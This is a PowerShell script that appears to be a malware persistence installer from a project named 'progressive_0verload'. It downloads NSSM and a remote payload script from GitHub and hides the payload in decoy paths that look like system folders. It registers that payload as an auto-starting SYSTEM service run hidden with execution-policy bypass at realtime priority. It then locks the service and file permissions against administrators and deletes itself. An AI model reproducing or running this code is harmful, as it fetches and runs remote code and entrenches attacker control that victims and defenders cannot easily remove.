param(
    [string]$basePath
)

$paths = @(
    ($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),
    ($env:systemdrive + "\Recovery"),
    "$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces",
    "$env:windir\WinSxS\Temp\PendingRenames\Pending\ManifestCache"
)
$curr = $MyInvocation.MyCommand.Path
$arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
if($arch -eq "64-bit"){
    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx64.exe"
}else{
    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx32.exe"
}
$nssmFolder = "$env:windir\system32\wbem\nssm"
$nssmexe = "$nssmFolder\nssm.exe"
$fwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$fwdmonPath = "$fwdmonPath\fwd_mon.ps1"

$serviceName = "MyfwdmonService"
$exepath = "powershell.exe"
$arguments = "-ep bypass -nop -w hidden $fwdmonPath -basePath '$basePath' -exe '$nssmexe'"

if(-not(Test-Path -Path $nssmFolder -PathType Container)){
    New-Item -Path $nssmFolder -ItemType Directory -Force
}

if(-not(Test-Path -Path $nssmexe)){
    iwr -Uri $nssmUrl -OutFile $nssmexe
}

if(-not(Test-Path -Path $fwdmonPath -PathType Leaf)){
    iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fwd_mon.ps1" -OutFile $fwdmonPath
}

if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
    & $nssmexe stop $serviceName
    & $nssmexe remove $serviceName confirm
}

& $nssmexe install $serviceName $exePath $arguments
& $nssmexe set $serviceName Start SERVICE_AUTO_START
& $nssmexe set $serviceName ObjectName "LocalSystem"
& $nssmexe set $serviceName AppExit Default Exit
& $nssmexe set $serviceName AppExit 0 Exit
& $nssmexe set $serviceName AppPriority REALTIME_PRIORITY_CLASS
& $nssmexe set $serviceName AppStdout "$env:userprofile\fwdmon_srv.log"
& $nssmexe set $serviceName AppStderr "$env:userprofile\fwdmon_srv.log.error"
& $nssmexe start $serviceName

Start-Sleep -Seconds 3
$user = (Get-CimInstance -ClassName Win32_ComputerSystem).UserName
$SDDL = "O:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
sc.exe sdset $serviceName $SDDL

takeown /F $fwdmonPath
icacls $fwdmonPath /inheritance:r /Q 
icacls $fwdmonPath /grant:r "$($user):F" "NT AUTHORITY\SYSTEM:F" /Q 
icacls $fwdmonPath /setowner "NT AUTHORITY\SYSTEM" /Q 
icacls $fwdmonPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /Q 
icacls $fwdmonPath /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /Q 
icacls $fwdmonPath /remove "$user" /Q 

#attrib +h +s +r $nssmFolder 2>&1 | Out-Null
#attrib +h +s +r $fwdmonPath
pause
Remove-Item -Path $curr -Force -ErrorAction SilentlyContinue